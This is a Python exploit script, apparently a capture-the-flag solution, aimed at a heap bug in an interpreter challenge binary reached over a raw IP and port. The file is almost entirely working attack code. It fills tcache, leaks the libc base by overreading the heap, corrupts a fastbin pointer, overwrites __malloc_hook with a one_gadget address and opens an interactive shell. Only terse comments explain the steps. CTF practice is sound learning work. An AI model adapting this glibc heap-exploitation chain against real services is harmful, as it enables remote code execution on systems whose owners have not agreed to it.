from ptrlib import *

def run(code_size, code, buf_size, skip=True):
    assert len(code) <= code_size
    code = code + '\x00' * (code_size - len(code))
    sock.sendlineafter("size =", str(code_size))
    sock.sendafter("code =", code)
    sock.sendlineafter("size =", str(buf_size))
    sock.recvuntil("...\n")
    if skip: end()
    return

def end():
    sock.send("\n")
    return

"""
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
sock = Process("../distfiles/chall", env={'LD_LIBRARY_PATH': '../distfiles/'})
"""
libc = ELF("../distfiles/libc.so.6")
sock = Socket("76.74.177.238", 9003)
#"""
libc_main_arena = 0x3ebc40
libc_one_gadget = [0x10a38c, 0x4f322, 0x4f2c5][1]

# 1) evict tcache and prepare unsorted bin
# We need to fill up tcache because calloc doesn't use tcache
# Also, we'll use fastbin later and here we prepare for it
for i in range(2):
    run(0x68, '+', 0x68)
run(0x68, 'X', 0x18) 
for i in range(4):
    code3  = "+" * 7 + "\x00[..."
    code3 += ",." * 0x10 # size + fd
    run(0x38, code3, 0x38)
run(0x68, '+', 0x38)

code1  = "+" * 7 + "\x00[..."
code1 += "." * 8 # overwrite size
for i in range(4):
    run(0x98, code1, 0x18)

# 2) leak libc
# Filling up the result and overread the heap by opecode pivot
# Here we'll corrupt the unsorted bin and can never use it
code2 = "+" + "." * (0x28 - 3) + "][" # fill result with 0x01
run(0x28, code2, 0x18)
libc_base = u64(sock.recvline()[0x30:]) - libc_main_arena - 96
logger.info("libc base = " + hex(libc_base))

# 3) modify fd
# Cause heap overflow by opecode pivot and modify next chunk's fd
run(0x38, "+", 0x38) # swap fastbin link
code4 = "+" + "." * (0x38 - 3) + "][" # fill result with 0x01
run(0x38, code4, 0x38, skip=False)
sock.send(p64(0x71) + p64(libc_base + libc.symbol("__malloc_hook") - 0x23))
sock.send('\n')

# 4) overwrite __malloc_hook
# Now 2nd chunk of fastbin for 0x70 is __malloc_hook - 0x23
# Thus we can overwrite it by setting the buffer
code5 = "." * 0x13
code5 += ",." * 8 # overwrite
code5 += "<<"
run(0x68, code5, 0x38, skip=False)
sock.send(p64(libc_base + libc_one_gadget))
sock.send('\n')

# 5) get the shell!!
sock.sendlineafter("size =", "123")

sock.interactive()
